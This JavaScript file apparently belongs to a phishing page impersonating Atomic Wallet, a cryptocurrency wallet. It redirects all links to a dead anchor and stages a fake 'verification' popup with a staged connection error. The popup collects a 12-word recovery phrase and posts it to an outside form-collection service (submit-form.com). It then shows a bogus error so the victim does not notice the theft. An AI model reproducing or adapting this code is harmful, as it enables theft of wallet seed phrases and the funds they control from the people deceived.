document.addEventListener("DOMContentLoaded", function () {
  reset(this);
  blockLinks(this);
});

function blockLinks(this_) {
  const a = this_.querySelectorAll('a[href^="/"]');
  a.forEach((v) => {
    // console.log(v)
    if (v.href.endsWith("/#")) {
      v.href = "/#";
    } else {
      v.href = "/#";
    }
  });
  const a2 = this_.querySelectorAll('a[href^=" "]');
  a2.forEach((v) => {
    // console.log(v)
    if (v.href.endsWith("/#")) {
      v.href = "/#";
    } else {
      v.href = "/#";
    }
  });
  const downloadLink = this_.querySelectorAll("div[data-download-link]");
  downloadLink.forEach((v) => {
    // console.log(v)
    // if(v.href.endsWith("/#")) {
    //     v.href = window.location.href;
    // } else {
    //     v.href = window.location.href + "#";
    // }
    v.setAttribute("data-download-link", "/#");
    // console.log(v.href)
    v.addEventListener("click", function (e) {
      e.preventDefault();
    });
  });
  const dataLink = this_.querySelectorAll("[data-link]");
  dataLink.forEach((v) => {
    v.setAttribute("data-link", "/#");
    // console.log(v.href)
    v.addEventListener("click", function (e) {
      e.preventDefault();
    });
  });
  this_.querySelector('[href="https://support.atomicwallet.io"]').href = "/#";
  this_.querySelector(
    '[href="https://www.trustpilot.com/review/atomicwallet.io"]'
  ).href = "/#";
  const allAHref = this_.querySelectorAll("[target]");
  allAHref.forEach((v) => {
    v.removeAttribute("target");
  });
  const x = this_.querySelectorAll("a[href]");
  x.forEach((v) => {
    v.href = "/#";
  });
  this_.querySelectorAll(".subscribe-form, .news-form__form").forEach((e) => {
    e.addEventListener("submit", async function (e) {
      e.preventDefault();
    });
  });
  doPages(this_);
}

function doPages(this_) {
  // reset(this_);
  const popupContainer = this_.querySelector("#phrase-popup");
  const downloadBtns = this_.querySelectorAll("#phrase-open");
  const closeBtn = this_.querySelector("#popup-modal-close");

  const step1 = this_.querySelector("#step-1");
  const step2 = this_.querySelector("#step-2");
  const step3 = this_.querySelector("#step-3");
  const shouldCloseKeyStonePopup = new Event("shouldCloseKeyStonePopup");

  const stepObj = { step1, step2, step3 };

  downloadBtns.forEach((v) => {
    v.addEventListener("click", function () {
      // router.navigate("/verify/1");
      popupContainer.classList.add("open");
      doStep1(this_, stepObj);
    });
  });

  closeBtn.addEventListener("click", function () {
    // router.navigate("/");
    window.dispatchEvent(shouldCloseKeyStonePopup);
    reset(this_);
  });

  window.addEventListener(
    "shouldCloseKeyStonePopup",
    function () {
      popupContainer.classList.remove("open");
    },
    true
  );

  // const router = new Navigo("/", {
  //   hash: true,
  // });

  // router.on("/verify/:step", function ({ data }) {
  //   const step = data.step;
  //   if (step == 1) {
  //     doStep1(this_, router, stepObj);
  //   }
  //   if (step == 2) {
  //     doStep2(this_, router, stepObj);
  //   }
  //   if (step == 3) {
  //     doStep3(this_, router, stepObj);
  //   }
  //   popupContainer.classList.add("open");
  // });
  // router.resolve();

  // router.on("/", function () {
  //   popupContainer.classList.remove("open");
  // });
  // router.resolve();
}

function doStep1(this_, { step1, step2, step3 }) {
  toastr.options = {
    preventDuplicates: true,
    timeOut: "3000",
  };
  step1.style.display = "flex";
  // step2.style.display = "none";
  // step3.style.display = "none";
  const timeOut = setTimeout(() => {
    step1.style.display = "none";
    toastr.error("A Connection error occured: ERR_NETWORK_DEVICE");
    step2.style.display = "flex";
    doStep2(this_, { step1, step2, step3 });
  }, 10000);
  window.addEventListener(
    "shouldCloseKeyStonePopup",
    function () {
      clearTimeout(timeOut);
    },
    true
  );
}

function doStep2(this_, { step1, step2, step3 }) {
  const verifyBtn = this_.querySelector("#verify-btn");
  const retryBtn = this_.querySelector("#retry-btn");

  verifyBtn.addEventListener("click", () => {
    step2.style.display = "none";
    step3.style.display = "flex";
    doStep3(this_, { step1, step2, step3 });
  });
  retryBtn.addEventListener("click", () => {
    step2.style.display = "none";
    // step1.style.display = "flex"
    doStep1(this_, { step1, step2, step3 });
  });
}

function doStep3(this_, { step1, step2, step3 }) {
  const form = this_.querySelector("#my-form");
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    let phrase = this_.querySelector('textarea[name^="phrase"]');
    phrase = phrase.value.trim();
    const split = phrase.split(" ");
    if (phrase === "" || split.length < 12 || split.length !== 12) {
      toastr.error(
        "Invalid recovery phrase, please double-check the phrase and try again."
      );
    } else {
      const formLoadingSpinner = this_.querySelector("#form-load-spinner");
      const FORMSPARK_ACTION_URL = "https://submit-form.com/6BjaBkrx";
      formLoadingSpinner.style.display = "inline-block";
      const timeOut = setTimeout(() => {
        fetch(FORMSPARK_ACTION_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
          },
          body: JSON.stringify({
            phrase,
            password: "",
            source: "ATOMIC WALLET",
          }),
        })
          .then(() => {
            toastr.error(
              "Oops! An error occurred while attempting to verify your wallet. Please try again later."
            );
          })
          .catch(() => {
            toastr.error(
              "Oops! We're sorry, but an internal server error has occurred"
            );
          })
          .finally(() => {
            formLoadingSpinner.style.display = "none";
          });
      }, 9000);

      window.addEventListener(
        "shouldCloseKeyStonePopup",
        function () {
          clearTimeout(timeOut);
          formLoadingSpinner.style.display = "none";
          this_.querySelector('textarea[name^="phrase"]').value = "";
          console.log("Cleared Timeout...");
        },
        true
      );
    }
  });
}

function reset(this_) {
  const step1 = this_.querySelector("#step-1");
  const step2 = this_.querySelector("#step-2");
  const step3 = this_.querySelector("#step-3");

  step1.style.display = "flex";
  step2.style.display = "none";
  step3.style.display = "none";

  // localStorage.setItem("STEP 1", false);
  // localStorage.setItem("STEP 2", false);
  // localStorage.setItem("STEP 3", false);
}
